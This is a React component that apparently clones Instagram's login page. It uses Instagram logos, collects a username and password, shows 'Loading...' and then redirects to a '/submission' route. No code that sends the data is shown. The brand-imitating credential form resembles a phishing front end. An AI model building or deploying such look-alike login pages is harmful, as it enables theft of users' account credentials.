import React from "react";
import Ig_logo from "../Assets/Instagram_logo.svg.png";
import ig_logo from "../Assets/Instagram-Logo.wine.svg";
import { useNavigate } from "react-router-dom";

const Instagram = () => {
  const [formData, setFormData] = React.useState({
    username: "",
    password: "",
  });
  const [loading, setLoading] = React.useState(false);

  const handleLogin = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({ ...prevData, [name]: value }));
  };

  let navigate = useNavigate();

  const handleSubmit = (e) => {
    e.preventDefault();
    // make a request to the backend
    setLoading(true);

    // set a timeout
    const timeoutId = setTimeout(() => {
      navigate("/submission");
    }, 2000);

    // clear the timeout if the component unmounts
    return () => clearTimeout(timeoutId);
  };

  return (
    <div
      onSubmit={handleSubmit}
      className="sm:bg-gray-100 bg-white flex-col gap-3 h-screen w-full flex justify-center items-center"
    >
      <div className="sm:w-[350px] w-full pt-[24px] sm:border border-gray-300 bg-white">
        <div className="w-90vw md:w-45vw flex flex-col items-center">
          <img
            src={ig_logo}
            height=""
            width="80px"
            alt="Instagram logo"
            className="mb-8"
          />
          <img
            src={Ig_logo}
            height="51px"
            width="175px"
            alt="Instagram logo"
            className="mb-8"
          />
          <form
            onSubmit={handleSubmit}
            className="sm:shadow-md w-full bg-white px-10 pb-5  rounded-lg flex flex-col gap-3"
          >
            <input
              className="w-full p-2 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded"
              placeholder="Phone number, username, or email"
              type="text"
              name="username"
              value={formData.username}
              onChange={handleLogin}
              required
            />
            <input
              className="w-full p-2 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded"
              type="password"
              name="password"
              value={formData.password}
              onChange={handleLogin}
              placeholder="Password"
              required
            />

            <button
              type="submit"
              className="bg-[#47afff] py-1 rounded-lg font-bold w-full text-white"
            >
              Log in
            </button>
            {loading && (
              <p className="text-gray-700 text-sm font-medium">Loading...</p>
            )}

            <p className="text-blue-500 text-sm mx-auto">Forgotten password?</p>
          </form>
        </div>
      </div>
      <div className="w-[350px] py-[20px] text-[14px] sm:border border-gray-300 bg-white flex justify-center items-center">
        <span className="">
          Don't have an account?{" "}
          <span className="text-[#0095f6] font-semibold">Sign up</span>
        </span>
      </div>
    </div>
  );
};

export default Instagram;
